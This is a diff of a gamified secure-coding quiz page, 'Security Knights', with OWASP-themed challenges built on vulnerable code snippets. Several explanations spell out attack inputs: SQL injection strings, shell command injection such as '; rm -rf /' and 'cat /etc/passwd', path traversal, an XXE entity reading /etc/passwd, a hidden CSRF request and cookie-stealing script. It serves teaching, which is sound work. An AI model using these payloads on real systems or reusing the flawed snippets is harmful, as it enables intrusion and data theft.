+@keyframes xppop{0%{opacity:1;transform:translateY(0)}100%{opacity:0;transform:translateY(-80px)}}
 </style>
 </head>
 <body>
+
+<!-- ── INTRO ── -->
+<div id="intro">
+  <canvas id="intro-canvas"></canvas>
+  <div id="intro-stars"></div>
+  <span class="intro-skip" onclick="skipIntro()">Skip ▶</span>
+  <div id="intro-content">
+    <div class="intro-slide active" id="slide-0">
+      <div class="intro-emoji">⚔️</div>
+      <div class="intro-title">Security Knights</div>
+      <div class="intro-sub">A quest for secure code</div>
+      <div class="intro-progress"><div class="intro-dot active"></div><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot"></div></div>
+    </div>
+    <div class="intro-slide" id="slide-1">
+      <div class="intro-emoji">🌑</div>
+      <div class="intro-story">In the realm of <strong>Codehaven</strong>, dark sorcerers exploit the <em>vulnerabilities</em> of unsuspecting applications — stealing secrets, corrupting data, and plunging the kingdom into chaos...</div>
+      <div class="intro-progress"><div class="intro-dot"></div><div class="intro-dot active"></div><div class="intro-dot"></div><div class="intro-dot"></div></div>
+    </div>
+    <div class="intro-slide" id="slide-2">
+      <div class="intro-emoji">🛡️</div>
+      <div class="intro-story">The <strong>Council of Knights</strong> has summoned you — a warrior trained in the ancient art of <em>secure coding</em>. Walk the sacred path, answer each challenge, and <strong>protect the realm</strong>.</div>
+      <div class="intro-progress"><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot active"></div><div class="intro-dot"></div></div>
+    </div>
+    <div class="intro-slide" id="slide-3">
+      <div class="intro-emoji">🏰</div>
+      <div class="intro-story">Fifteen stepping stones stand between you and the <strong>Shadow Castle</strong>. Each stone guards a secret of the <em>OWASP Top 10</em>. Answer correctly and advance. The realm is counting on you.</div>
+      <div class="intro-progress"><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot active"></div></div>
+      <button class="intro-btn" onclick="startIntro()">⚔️ Begin Your Quest</button>
+    </div>
+  </div>
+</div>
 
 <!-- ── API KEY MODAL ── -->
 <div class="overlay" id="keyModal">
   <div class="mcard">
     <h2>The Wizard Awaits</h2>
-    <p>Enter your Anthropic API key to unlock Merlin the Security Wizard — or begin in demo mode.</p>
+    <p>Enter your Anthropic API key to unlock Merlin — or begin in <strong style="color:var(--gold)">demo mode</strong> (full game access, pre-written hints).</p>
     <input type="password" class="minput" id="modalKey" placeholder="sk-ant-api03-..." autocomplete="off"/>
-    <p class="mnote">🔒 Stored in sessionStorage only</p>
+    <p class="mnote">🔒 Stored in sessionStorage only — clears when tab closes</p>
     <div class="macts">
       <button class="bgold" id="btnSave">Enter the Castle</button>
-      <button class="bghost" id="btnDemo">Train Without Wizard</button>
+      <button class="bghost" id="btnDemo">Demo Mode (Full Access)</button>
     </div>
   </div>
 </div>
@@ -270,1290 +258,1249 @@ html,body{height:100%;overflow:hidden;background:#090C18;}
   <div class="hud-left">
     <a href="security-knights.html" class="nav-a back-btn">← Back</a>
     <div class="hud-logo">⚔️ Security Knights</div>
-    <a href="index.html" class="nav-a">🏠 Home</a>
-    <a href="projects.html" class="nav-a">📁 Projects</a>
+    <a href="index.html" class="nav-a">🏠</a>
+    <a href="projects.html" class="nav-a">📁</a>
   </div>
   <div class="hud-center">
     <div class="rbadge rp" id="rankBadge">🛡️ Paige</div>
     <div class="xpw">
-      <div class="xplbl"><span>XP</span><span id="xpLbl">0 / 200</span></div>
+      <div class="xplbl"><span>XP</span><span id="xpLbl">0/200</span></div>
       <div class="xpbar"><div class="xpfill" id="xpFill" style="width:0%"></div></div>
     </div>
     <div class="bdgs">
-      <div class="bicon" id="bp" title="Paige">🛡️</div>
-      <div class="bicon" id="bs" title="Squire">⚔️</div>
-      <div class="bicon" id="bk" title="Knight">👑</div>
+      <div class="bicon" id="bp" title="Paige Badge">🛡️</div>
+      <div class="bicon" id="bs" title="Squire Badge">⚔️</div>
+      <div class="bicon" id="bk" title="Knight Badge">👑</div>
     </div>
   </div>
   <div class="hud-right">
-    <button id="wizToggle">🧙 Wizard</button>
+    <button class="hud-btn" id="btnQuests" onclick="toggleSidebar()">📜 Quests</button>
+    <button class="hud-btn" id="btnWiz" onclick="toggleWizard()">🧙 Wizard</button>
+    <button class="hud-btn" id="btnMute" onclick="toggleMusic()">🔊</button>
   </div>
 </div>
 
-<!-- ── MAP CANVAS ── -->
-<canvas id="gc"></canvas>
-
-<!-- ── QUESTION PANEL ── -->
-<div id="qpanel">
-  <div class="qp-header">
-    <div>
-      <div class="qp-tag" id="qpTag">⚔️ Challenge</div>
-      <div style="font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-top:3px;" id="qpSub"></div>
+<!-- ── LAYOUT ── -->
+<div id="layout">
+  <!-- Left sidebar -->
+  <div id="sidebar-left">
+    <div id="sb-inner">
+      <div class="sb-title">⚔️ Quest Board</div>
+      <div class="sb-tier">
+        <div class="sb-tier-hdr">
+          <div class="sb-tier-name" style="color:var(--pc)">🛡️ Paige</div>
+          <div class="sb-tier-cnt" id="pcnt">0/5</div>
+        </div>
+        <div id="pquests"></div>
+      </div>
+      <div class="sb-tier">
+        <div class="sb-tier-hdr">
+          <div class="sb-tier-name" style="color:var(--sc)">⚔️ Squire</div>
+          <div class="sb-tier-cnt" id="scnt">0/5</div>
+        </div>
+        <div id="squests"></div>
+      </div>
+      <div class="sb-tier">
+        <div class="sb-tier-hdr">
+          <div class="sb-tier-name" style="color:var(--kc)">👑 Knight</div>
+          <div class="sb-tier-cnt" id="kcnt">0/5</div>
+        </div>
+        <div id="kquests"></div>
+      </div>
+      <button class="sb-reset" onclick="resetGame()">↺ Reset Progress</button>
     </div>
-    <div class="qp-xp" id="qpXp">+0 XP</div>
   </div>
-  <div class="qp-title" id="qpTitle">Loading...</div>
-  <div class="qp-body" id="qpBody"></div>
-  <div class="codebox" id="qpCode" style="display:none"></div>
-  <div class="opts" id="qpOpts"></div>
-  <div class="expl" id="qpExpl"></div>
-  <button class="nxt" id="nxtBtn" onclick="onNext()">Continue Quest →</button>
-</div>
 
-<!-- ── WIZARD PANEL ── -->
-<div id="wpanel">
-  <div class="whdr">
-    <div class="wav">🧙</div>
-    <div><div class="wname">Merlin the Wizard</div><div class="wsub">Ask me anything</div></div>
+  <!-- Map -->
+  <div id="map-area">
+    <canvas id="gc"></canvas>
+    <div id="qpanel">
+      <div class="qp-hdr">
+        <div>
+          <div class="qp-tag" id="qpTag">⚔️ Challenge</div>
+          <div style="font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-top:3px;" id="qpSub"></div>
+        </div>
+        <div class="qp-xp" id="qpXp">+0 XP</div>
+      </div>
+      <div class="qp-title" id="qpTitle"></div>
+      <div class="qp-body" id="qpBody"></div>
+      <div class="codebox" id="qpCode" style="display:none"></div>
+      <div class="opts" id="qpOpts"></div>
+      <div class="expl" id="qpExpl"></div>
+      <button class="nxt" id="nxtBtn" onclick="onNext()">Continue Quest →</button>
+    </div>
   </div>
-  <div class="wmsgs" id="wmsgs">
-    <div class="wm wiz"><strong>Greetings, young squire!</strong> I am Merlin. Ask for hints or explanations as you journey through the realm! 🧙</div>
-  </div>
-  <div class="hints">
-    <button class="hbtn" data-hint="hint">💡 Hint</button>
-    <button class="hbtn" data-hint="explain">📖 Explain</button>
-    <button class="hbtn" data-hint="realworld">🌍 Real example</button>
-    <button class="hbtn" data-hint="prevent">🛡️ Prevention</button>
-  </div>
-  <div class="winput-wrap">
-    <div class="winput-row">
-      <input type="text" class="winput" id="winput" placeholder="Ask the wizard…" autocomplete="off"/>
-      <button class="wsend" id="wsend">➤</button>
+
+  <!-- Wizard -->
+  <div id="wpanel">
+    <div class="whdr">
+      <div class="wav">🧙</div>
+      <div><div class="wname">Merlin the Wizard</div><div class="wsub">Ask me anything</div></div>
+    </div>
+    <div class="wmsgs" id="wmsgs">
+      <div class="wm wiz"><strong>Greetings!</strong> I am Merlin. I shall guide you through the realm — ask for hints, explanations, or real-world examples! 🧙✨</div>
+    </div>
+    <div class="hints">
+      <button class="hbtn" data-hint="hint">💡 Hint</button>
+      <button class="hbtn" data-hint="explain">📖 Explain</button>
+      <button class="hbtn" data-hint="realworld">🌍 Real example</button>
+      <button class="hbtn" data-hint="prevent">🛡️ Prevention</button>
+    </div>
+    <div class="winput-wrap">
+      <div class="winput-row">
+        <input type="text" class="winput" id="winput" placeholder="Ask the wizard…" autocomplete="off"/>
+        <button class="wsend" id="wsend">➤</button>
+      </div>
     </div>
   </div>
 </div>
 
 <script>
-// ═══════════════════════════════════════════════════════
-// CHALLENGE DATA
-// ═══════════════════════════════════════════════════════
-var CHALLENGES = [
-  { id:1, rank:'paige', xp:10, topic:'SQL Injection', title:'The Poisoned Scroll',
-    body:'A kingdom\'s library lets visitors search scrolls by name. Look at the search code. What is the vulnerability?',
-    code:'const query = "SELECT * FROM scrolls\n  WHERE title = \'" + userInput + "\'";\ndb.execute(query); // userInput goes straight in!',
-    options:['Missing input validation on the title','SQL Injection — user input is concatenated directly into the query','The database connection is unencrypted','The query selects too many columns'],
-    correct:1, explanation:'Classic SQL Injection! An attacker inputs: \' OR 1=1-- to return all rows, or \'; DROP TABLE scrolls;-- to destroy the database. Fix: always use parameterized queries / prepared statements.' },
+// ═══════════════════════════════════════════════
+// CHALLENGE BANK (10 per tier, 5 chosen randomly)
+// ═══════════════════════════════════════════════
+var ALL_CHALLENGES = {
+paige: [
+  {id:1,xp:10,topic:'SQL Injection',title:'The Poisoned Scroll',
+   body:"A library lets visitors search scrolls by name. Look at the code. What is the vulnerability?",
+   code:'const query = "SELECT * FROM scrolls\n  WHERE title = \'" + userInput + "\'";\ndb.execute(query);',
+   options:['Missing input validation on title','SQL Injection — user input concatenated directly into the query','Database connection is unencrypted','Query selects too many columns'],
+   correct:1,explanation:'Classic SQL Injection! An attacker inputs: \' OR 1=1-- to return all rows, or \'; DROP TABLE scrolls;-- to destroy the database. Fix: always use parameterized queries / prepared statements.'},
+  {id:2,xp:10,topic:'XSS',title:'The Enchanted Message Board',
+   body:"The village board renders messages this way. What dark magic lurks?",
+   code:'// Displaying the message\nmessageDiv.innerHTML = userMessage; // from form input',
+   options:['The code uses innerHTML instead of textContent','Missing authentication check','Variable name is too short','The page loads too slowly'],
+   correct:0,explanation:'innerHTML with user input enables XSS. An attacker injects script tags and it runs in every browser. Fix: use textContent, or sanitize with DOMPurify.'},
+  {id:3,xp:10,topic:'Password Storage',title:'The Vault of Secrets',
+   body:"The castle stores passwords. Which storage method is most dangerous?",
+   code:'',
+   options:['Hashed with bcrypt (cost 12)','Hashed with SHA-256','Stored as plain text in the database','Hashed with Argon2id'],
+   correct:2,explanation:'Plain text passwords mean a single database breach exposes everyone. Use bcrypt or Argon2id — never plain text, and avoid fast hashes like MD5/SHA-256 for passwords.'},
+  {id:4,xp:15,topic:'Hardcoded Credentials',title:'The Open Gate',
+   body:"The castle gate checks identity with this spell. Spot the critical flaw:",
+   code:'if (username === "admin" && password === "password123") {\n  grantAccess();\n}',
+   options:['The condition uses === instead of ==','Hardcoded credentials visible in source code','Function name is misleading','Missing a return statement'],
+   correct:1,explanation:'Hardcoded credentials are catastrophic — anyone who reads the source code gains admin access. Credentials belong in environment variables or a secrets manager, never in code.'},
+  {id:5,xp:15,topic:'HTTPS',title:'The Secret Messenger',
+   body:"A knight sends credentials across the network. Which path is safe?",
+   code:'',
+   options:['HTTP — readable across the network','HTTPS — encrypted in a sealed chest (TLS)','FTP — the fastest courier','Credentials are always safe on local networks'],
+   correct:1,explanation:'HTTP transmits data in plain text — any network spy can read it. HTTPS encrypts the connection with TLS. Never transmit credentials over HTTP.'},
+  {id:6,xp:10,topic:'Input Validation',title:'The Cursed Form',
+   body:"A registration form accepts a username without validation. What is the most dangerous consequence?",
+   code:'app.post("/register", (req, res) => {\n  var user = req.body.username; // no validation\n  db.query("INSERT INTO users (name) VALUES (\'" + user + "\')");\n});',
+   options:['Users might enter funny names','Injection attacks via the username field','The form submits too slowly','Missing a CAPTCHA'],
+   correct:1,explanation:'Without validation, an attacker can inject SQL or scripts via the username field. Always validate and sanitize ALL user inputs before processing them.'},
+  {id:7,xp:10,topic:'Session Management',title:'The Stolen Token',
+   body:"After login, the server issues a session token. Which practice is most dangerous?",
+   code:'',
+   options:['Using HttpOnly cookies','Storing session tokens in localStorage','Regenerating session ID after login','Using Secure flag on cookies'],
+   correct:1,explanation:'localStorage is accessible by JavaScript — any XSS attack can steal it. Store session tokens in HttpOnly cookies so JavaScript cannot access them at all.'},
+  {id:8,xp:10,topic:'Error Messages',title:'The Revealing Oracle',
+   body:"A login form returns this error. What security problem does this create?",
+   code:'// When username found but password wrong:\nreturn "Incorrect password for user admin@castle.com";\n// When username not found:\nreturn "User not found";',
+   options:['Too many characters in the message','User enumeration — reveals which accounts exist','The error is not logged','Missing a CAPTCHA'],
+   correct:1,explanation:'Different error messages for wrong username vs wrong password let attackers enumerate valid accounts. Always return a generic message like "Invalid username or password".'},
+  {id:9,xp:15,topic:'Path Traversal',title:'The Hidden Dungeon',
+   body:"A file server lets users download files by name. What danger lurks?",
+   code:'app.get("/download", (req, res) => {\n  var file = req.query.name; // e.g. "report.pdf"\n  res.sendFile(__dirname + "/files/" + file);\n});',
+   options:['Files download too slowly','Path traversal — attacker uses ../../etc/passwd to read server files','Missing file type check','No authentication on the route'],
+   correct:1,explanation:'Without path validation, an attacker passes ../../etc/passwd to read arbitrary server files. Fix: use path.resolve() and verify the result is within your allowed directory.'},
+  {id:10,xp:15,topic:'Command Injection',title:"The Sorcerer's Command",
+   body:"The castle runs system commands with user input. What is the vulnerability?",
+   code:'const { exec } = require("child_process");\napp.get("/ping", (req, res) => {\n  exec("ping " + req.query.host, (err, out) => res.send(out));\n});',
+   options:['ping command is too slow','Command injection — attacker adds ; rm -rf / to the host param','Missing error handling','Network permission issue'],
+   correct:1,explanation:'Concatenating user input into shell commands allows command injection. An attacker passes "8.8.8.8; cat /etc/passwd" to run arbitrary commands. Fix: use execFile with argument arrays, never exec with string concatenation.'}
+],
 
-  { id:2, rank:'paige', xp:10, topic:'XSS', title:'The Enchanted Message Board',
-    body:'The village board renders messages this way. What dark magic lurks?',
-    code:'// Displaying the knight\'s message\nmessageDiv.innerHTML = userMessage; // from form input',
-    options:['The code uses innerHTML instead of textContent','Missing authentication check','The variable name is too short','The page loads too slowly'],
-    correct:0, explanation:'Using innerHTML with user input enables XSS (Cross-Site Scripting). An attacker injects \u003cscript\u003esteal(document.cookie)\u003c/script\u003e and it runs in every visitor\'s browser. Fix: use textContent, or sanitize with DOMPurify.' },
+squire: [
+  {id:11,xp:20,topic:'CSRF',title:'The Forged Royal Decree',
+   body:"A knight visits an evil page that silently transfers gold on their behalf. What is this attack?",
+   code:"<!-- On the evil website -->\n<img src=\"https://royalbank.com/transfer?to=evil&amount=1000\"\n     style=\"display:none\" />",
+   options:['SQL Injection targeting the bank','Cross-Site Request Forgery (CSRF)','Cross-Site Scripting (XSS)','Man-in-the-Middle Attack'],
+   correct:1,explanation:'CSRF tricks the browser into sending authenticated requests the user never intended. The browser automatically includes cookies. Fix: CSRF tokens (secret random values validated server-side) and SameSite cookie attributes.'},
+  {id:12,xp:20,topic:'IDOR',title:'The Stolen Key',
+   body:"Knight Alice requests another knight's private documents. What flaw is this?",
+   code:'GET /api/documents/12345\nAuthorization: Bearer alice_token\n// Returns Bob\'s private documents!',
+   options:['Rate limiting — too many requests','Insecure Direct Object Reference (IDOR) — no authorization check','SQL Injection in the document ID','Missing HTTPS'],
+   correct:1,explanation:'IDOR is a broken access control flaw. The server verifies WHO you are (authentication) but not whether you\'re ALLOWED to access that specific resource (authorization). Always check per-object permissions.'},
+  {id:13,xp:25,topic:'Cryptography',title:'The Weak Cipher',
+   body:"Which password hashing choice would horrify the security council?",
+   code:'',
+   options:['bcrypt with cost factor 12','Argon2id with memory 64MB','MD5 — fast and widely supported','scrypt with N=32768'],
+   correct:2,explanation:'MD5 is a fast hashing algorithm. GPUs crack MD5 hashes at ~200 billion per second. Use slow algorithms (bcrypt, Argon2, scrypt) — deliberately expensive so brute-force takes years.'},
+  {id:14,xp:20,topic:'File Upload',title:'The Trojan Scroll',
+   body:"An attacker uploads a file named evil.php. What is the correct defense?",
+   code:'app.post("/upload", (req, res) => {\n  var name = req.file.originalname; // "evil.php"\n  fs.writeFileSync("./uploads/" + name, req.file.buffer);\n  res.send("Uploaded!");\n});',
+   options:['Only check the file extension','Validate MIME type from Content-Type only','Validate by magic bytes, restrict extensions, store outside web root, rename files','Limit size to under 10MB'],
+   correct:2,explanation:'Checking only extensions is trivially bypassed (rename evil.php to evil.jpg). Proper defenses: validate content via magic bytes, whitelist extensions, store outside web root, and rename files to random UUIDs.'},
+  {id:15,xp:25,topic:'Security Headers',title:'The Missing Shield',
+   body:"Which HTTP response header controls which scripts can execute — blocking most XSS?",
+   code:'',
+   options:['X-Frame-Options','Strict-Transport-Security (HSTS)','Content-Security-Policy (CSP)','X-Content-Type-Options'],
+   correct:2,explanation:'CSP tells the browser which sources are trusted. A strong CSP like default-src \'self\' blocks inline scripts and third-party injections, drastically reducing XSS impact.'},
+  {id:16,xp:20,topic:'SSRF',title:'The Dark Portal',
+   body:"A knight can request any URL from the castle server. What attack does this enable?",
+   code:'app.get("/fetch", async (req, res) => {\n  var url = req.query.url; // any URL!\n  var data = await axios.get(url);\n  res.json(data.data);\n});',
+   options:['XSS via the fetched URL','SSRF — attacker can reach internal services like http://169.254.169.254','SQL Injection via URL','Rate limiting issue'],
+   correct:1,explanation:'SSRF (Server-Side Request Forgery) lets attackers make the server request internal resources — like cloud metadata endpoints (AWS IMDSv1) that expose credentials. Fix: validate and allowlist URLs, block internal IP ranges.'},
+  {id:17,xp:20,topic:'Insecure Deserialization',title:'The Cursed Object',
+   body:"The castle sends this serialized cookie to the client and trusts it on return. What happens?",
+   code:'// Server sets cookie:\nres.cookie("session", serialize({role:"user", id:42}));\n// On next request, server deserializes and trusts it:\nvar data = deserialize(req.cookies.session); // dangerous!',
+   options:['Cookie is too long','Insecure deserialization — attacker modifies the cookie to become admin','Missing HttpOnly flag','Cookie will expire'],
+   correct:1,explanation:'If you serialize data, send it to the client, and deserialize it on return without verification, the attacker can modify it. Always sign serialized data (HMAC) and verify the signature before deserializing.'},
+  {id:18,xp:25,topic:'API Security',title:'The Unguarded Gate',
+   body:"An API endpoint returns all user records. What is the most critical issue?",
+   code:'GET /api/users\n// Returns: [{id:1,name:"Alice",email:"...",password_hash:"..."}]\n// No authentication required',
+   options:['The response is too large','No authentication + exposing password hashes to anyone','Missing pagination','API version not specified'],
+   correct:1,explanation:'This endpoint has two critical issues: no authentication lets anyone call it, and returning password hashes gives attackers a head start on cracking. Always authenticate APIs and never expose sensitive fields.'},
+  {id:19,xp:20,topic:'Mass Assignment',title:'The Overloaded Spell',
+   body:"A user registration endpoint automatically assigns all request body fields. What can go wrong?",
+   code:'app.post("/register", async (req, res) => {\n  var user = await User.create(req.body); // assigns EVERYTHING!\n  res.json(user);\n});',
+   options:['Too many fields slow the server','Mass assignment — attacker adds isAdmin:true to become admin','Missing email validation','Password not hashed'],
+   correct:1,explanation:'Mass assignment lets attackers set fields they should not control (like isAdmin, role, or verified). Always use an explicit allowlist of fields: only assign the specific fields you expect from user input.'},
+  {id:20,xp:25,topic:'Rate Limiting',title:'The Endless Army',
+   body:"A login endpoint has no rate limiting. What attack does this enable?",
+   code:'app.post("/login", async (req, res) => {\n  // No rate limiting!\n  var user = await checkCredentials(req.body.user, req.body.pass);\n  if (user) res.json({token: generateToken(user)});\n  else res.status(401).json({error: "Invalid"});\n});',
+   options:['Password hashing is too slow','Credential stuffing and brute-force attacks — unlimited attempts','Missing HTTPS','CORS issue'],
+   correct:1,explanation:'Without rate limiting, attackers can try millions of password combinations (brute-force) or use stolen credential lists (credential stuffing). Fix: limit login attempts, add CAPTCHA, implement account lockout, and use IP-based throttling.'}
+],
 
-  { id:3, rank:'paige', xp:10, topic:'Password Storage', title:'The Vault of Secrets',
-    body:'The castle stores knight passwords. Which storage method is most dangerous?',
-    code:'',
-    options:['Hashed with bcrypt (cost 12)','Hashed with SHA-256','Stored as plain text in the database','Hashed with Argon2id'],
-    correct:2, explanation:'Plain text passwords mean a single database breach exposes everyone. Always use a slow hashing algorithm like bcrypt or Argon2id — never plain text, and avoid fast hashes (MD5, SHA-256) for passwords.' },
-
-  { id:4, rank:'paige', xp:15, topic:'Hardcoded Credentials', title:'The Open Gate',
-    body:'The castle gate checks identity with this spell. Spot the critical flaw:',
-    code:'if (username === "admin" && password === "password123") {\n  grantAccess();\n}',
-    options:['The condition uses === instead of ==','Hardcoded credentials — password is visible in source code','The function name grantAccess() is misleading','Missing a return statement'],
-    correct:1, explanation:'Hardcoded credentials are catastrophic. Anyone who reads the source code, a git history, or a leaked file gains admin access instantly. Credentials belong in environment variables or a secrets manager — never in code.' },
-
-  { id:5, rank:'paige', xp:15, topic:'HTTPS', title:'The Secret Messenger',
-    body:'A knight sends credentials across the castle network. Which path is safe?',
-    code:'',
-    options:['HTTP — travels as readable parchment across the network','HTTPS — message is encrypted in a sealed chest (TLS)','FTP — the fastest courier in the realm','Credentials are always safe on local networks'],
-    correct:1, explanation:'HTTP transmits data in plain text — any spy on the network can read it. HTTPS encrypts the connection with TLS. Never transmit credentials or session tokens over HTTP.' },
-
-  { id:6, rank:'squire', xp:20, topic:'CSRF', title:'The Forged Royal Decree',
-    body:'A knight visits an evil page that silently makes a bank transfer on their behalf. What is this attack?',
-    code:'<!-- On the sorcerer\'s website -->\n<img src="https://royalbank.com/transfer?to=evil&amount=1000"\n     style="display:none" />',
-    options:['SQL Injection targeting the bank','Cross-Site Request Forgery (CSRF)','Cross-Site Scripting (XSS)','Man-in-the-Middle Attack'],
-    correct:1, explanation:'CSRF tricks the browser into sending authenticated requests the user never intended. Fix: CSRF tokens (secret random values validated server-side) and SameSite cookie attributes.' },
-
-  { id:7, rank:'squire', xp:20, topic:'IDOR / Access Control', title:'The Stolen Key',
-    body:'Knight Alice requests another knight\'s private documents. What flaw is this?',
-    code:'GET /api/documents/12345\nAuthorization: Bearer alice_token\n// Returns Bob\'s private documents! Should it?',
-    options:['Rate limiting — too many requests','Insecure Direct Object Reference (IDOR) — no authorization check','SQL Injection in the document ID','Missing HTTPS'],
-    correct:1, explanation:'IDOR is a broken access control flaw. The server verifies WHO you are (authentication) but not whether you are ALLOWED to access that specific resource (authorization). Always check: does this user have permission to access this exact object?' },
-
-  { id:8, rank:'squire', xp:25, topic:'Cryptography', title:'The Weak Cipher',
-    body:'Which password hashing choice would horrify the castle\'s security council?',
-    code:'',
-    options:['bcrypt with cost factor 12','Argon2id with memory 64MB','MD5 — fast and widely supported','scrypt with N=32768'],
-    correct:2, explanation:'MD5 is a fast hashing algorithm. Modern GPUs crack MD5 hashes at ~200 billion per second. Password hashing needs SLOW algorithms (bcrypt, Argon2, scrypt) — making brute-force take years instead of seconds.' },
-
-  { id:9, rank:'squire', xp:20, topic:'File Upload', title:'The Trojan Scroll',
-    body:'An attacker uploads a file named "evil.php". What is the correct defense?',
-    code:'app.post("/upload", (req, res) => {\n  const name = req.file.originalname; // "evil.php"\n  fs.writeFileSync("./uploads/" + name, req.file.buffer);\n  res.send("Uploaded: " + name); // Can now be executed!\n});',
-    options:['Only check the file extension in the filename','Validate MIME type from the Content-Type header only','Validate content by magic bytes, restrict extensions, store outside web root, rename files','Limit file size to under 10MB'],
-    correct:2, explanation:'Checking only extensions is trivially bypassed. Proper defenses: validate content type via magic bytes, whitelist safe extensions, store uploads outside the web root, and rename files to random UUIDs.' },
-
-  { id:10, rank:'squire', xp:25, topic:'Security Headers', title:'The Missing Shield',
-    body:'Which HTTP response header controls which scripts can execute on your page — blocking most XSS attacks?',
-    code:'',
-    options:['X-Frame-Options','Strict-Transport-Security (HSTS)','Content-Security-Policy (CSP)','X-Content-Type-Options'],
-    correct:2, explanation:'Content-Security-Policy (CSP) tells the browser which sources of scripts and styles are trusted. A strong CSP like default-src \'self\' blocks inline scripts and third-party injections, drastically reducing XSS impact.' },
-
-  { id:11, rank:'knight', xp:30, topic:'JWT Security', title:'The Forged Sigil',
-    body:'A sorcerer modifies a JWT and changes the algorithm to "none". What catastrophe occurs?',
-    code:'// Original JWT header:\n{ "alg": "HS256", "typ": "JWT" }\n\n// Attacker\'s modified JWT:\n{ "alg": "none", "typ": "JWT" }\n// Payload: { "role": "admin" } — no signature needed!',
-    options:['The server rejects the unsigned token','The token expires faster','A vulnerable server accepts it with no signature — granting admin access','The JWT becomes larger'],
-    correct:2, explanation:'The alg:none attack exploits libraries that skip signature verification when alg is "none". Fix: explicitly reject alg:none server-side, pin the expected algorithm, and never trust the algorithm field from the token itself.' },
-
-  { id:12, rank:'knight', xp:30, topic:'Race Conditions', title:'The Twin Swords',
-    body:'Two knights simultaneously request the last 100 gold. Both pass the balance check. What dark magic occurs?',
-    code:'async function withdraw(amount) {\n  const balance = await getBalance(); // Both read: 100\n  if (balance >= amount) {\n    await deductBalance(amount);       // Both deduct 100!\n    return "Success";                  // Treasury: -100\n  }\n}',
-    options:['SQL Injection in deductBalance','A race condition — both pass the check before either deducts','Missing authentication on the endpoint','The async/await pattern is broken'],
-    correct:1, explanation:'This is a TOCTOU race condition. Both requests read balance=100, both pass the check, both deduct 100 — resulting in -100. Fix: database transactions with row-level locking (SELECT FOR UPDATE) or optimistic locking.' },
-
-  { id:13, rank:'knight', xp:35, topic:'XXE', title:'The Ancient Scroll Parser',
-    body:'The castle\'s XML parser processes this document. What can an attacker read?',
-    code:'<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY secret SYSTEM "file:///etc/passwd">\n]>\n<request>\n  <data>&secret;</data>\n</request>',
-    options:['XSS — XML rendered in the browser','XXE — reads arbitrary files from the server','CSRF — forges requests via XML','SQL Injection in the XML'],
-    correct:1, explanation:'XML External Entity (XXE) attacks abuse XML parsers that process external entity references. This reads /etc/passwd. Fix: disable external entity processing in your XML parser — most parsers have a FEATURE_SECURE_PROCESSING flag.' },
-
-  { id:14, rank:'knight', xp:30, topic:'Dependencies', title:'The Cursed Artifact',
-    body:'The castle imports a spell library last updated 4 years ago with 3 critical CVEs. What is the primary risk?',
-    code:'// package.json\n"dependencies": {\n  "ancient-spell-lib": "^1.0.0",  // CVE-2019-XXXX critical\n  "medieval-crypto": "0.0.1"       // Unmaintained since 2020\n}',
-    options:['The library name is not descriptive','Using ^ allows minor version updates','Known CVEs in dependencies can be exploited through your application','The library may have breaking changes'],
-    correct:2, explanation:'Using components with known vulnerabilities is OWASP A06. A CVE in a dependency can be exploited through your application even if your own code is perfect. Use npm audit, Snyk, or Dependabot — always patch promptly.' },
-
-  { id:15, rank:'knight', xp:35, topic:'Logging & Monitoring', title:'The Silent Watchtower',
-    body:'An attack went undetected for 72 hours. The logs show what happened — but nobody was alerted. Which OWASP category failed?',
-    code:'// The castle\'s event log:\n[03:42] Login failed x 500  <- no alert triggered\n[03:43] Admin account accessed\n[03:44] 50,000 records exported\n[03:45] ...\n// First alert: 72 hours later',
-    options:['Broken Access Control','Security Misconfiguration','Security Logging and Monitoring Failures','Cryptographic Failures'],
-    correct:2, explanation:'OWASP A09: Security Logging and Monitoring Failures. 500 failed logins should trigger an immediate alert. Best practices: log all auth events, alert on anomalies, retain logs 90+ days, and regularly test your detection capability.' }
-];
-
-// ═══════════════════════════════════════════════════════
-// GAME CONSTANTS & STATE
-// ═══════════════════════════════════════════════════════
-var RANK_ORDER = ['paige','squire','knight'];
-var XP_THRESH  = { paige:0, squire:200, knight:500 };
-var RANK_ICONS = { paige:'🛡️', squire:'⚔️', knight:'👑' };
-var RANK_LABELS= { paige:'Paige', squire:'Squire', knight:'Knight' };
-var RANK_CSS   = { paige:'rp', squire:'rs', knight:'rk' };
-
-var MAP_W = 3600;
-var MAP_H = 560;
-var CAM_EASE = 0.06;
-
-// Stone waypoints: start + 15 challenge stones + end
-var WAYPOINTS = [
-  {x:80,  y:440, stone:0},  // start
-  {x:260, y:400, stone:1},
-  {x:460, y:450, stone:2},
-  {x:650, y:410, stone:3},
-  {x:850, y:450, stone:4},
-  {x:1060,y:410, stone:5},
-  {x:1280,y:440, stone:6},
-  {x:1480,y:400, stone:7},
-  {x:1680,y:450, stone:8},
-  {x:1880,y:410, stone:9},
-  {x:2080,y:450, stone:10},
-  {x:2300,y:410, stone:11},
-  {x:2500,y:450, stone:12},
-  {x:2700,y:410, stone:13},
-  {x:2900,y:450, stone:14},
-  {x:3100,y:410, stone:15},
-  {x:3380,y:430, stone:16}  // end/castle
-];
-
-// Game state
-var state = JSON.parse(localStorage.getItem('sk3_state') || 'null') || {
-  xp:0, rank:'paige', completed:[], badges:[]
+knight: [
+  {id:21,xp:30,topic:'JWT Security',title:'The Forged Sigil',
+   body:'A sorcerer changes the JWT algorithm to "none". What catastrophe occurs?',
+   code:'// Original JWT header:\n{ "alg": "HS256", "typ": "JWT" }\n\n// Attacker modified:\n{ "alg": "none", "typ": "JWT" }\n// Payload: { "role": "admin" } — no signature!',
+   options:['Server rejects the unsigned token','Token expires faster','Vulnerable server accepts it with no signature — granting admin access','JWT becomes larger'],
+   correct:2,explanation:'The alg:none attack exploits libraries that skip signature verification. Fix: explicitly reject alg:none server-side, pin the expected algorithm, never trust the algorithm field from the token itself.'},
+  {id:22,xp:30,topic:'Race Conditions',title:'The Twin Swords',
+   body:"Two knights simultaneously request the last 100 gold. Both pass the balance check. What occurs?",
+   code:'async function withdraw(amount) {\n  const balance = await getBalance(); // Both read: 100\n  if (balance >= amount) {\n    await deductBalance(amount);       // Both deduct 100!\n    return "Success";                  // Treasury: -100\n  }\n}',
